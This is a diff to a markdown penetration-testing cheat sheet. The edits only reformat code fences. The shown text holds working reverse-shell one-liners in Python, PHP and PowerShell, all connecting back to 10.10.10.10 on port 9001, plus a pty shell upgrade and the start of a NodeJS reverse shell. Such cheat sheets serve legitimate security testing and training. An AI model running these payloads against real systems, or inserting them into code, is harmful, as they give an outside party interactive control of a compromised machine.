@@ -141,9 +141,8 @@ Start with automated tools to search for low hanging fruits
 ```python
   python -c 'import pty;pty.spawn("/bin/bash")';
 ```
-    ```python
-    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-    ```
+```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
     #### PHP
 ```php
     php -r '$sock=fsockopen("10.10.10.10",9001);system("sh <&3 >&3 2>&3");'
@@ -191,9 +190,9 @@ int main(void){
     ### Powershell
 ```powershell
     powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-    ```
+ ```
    #### NodeJS
-    ```js
+    ```javascript
     (function(){
     var net = require("net"),
         cp = require("child_process"),
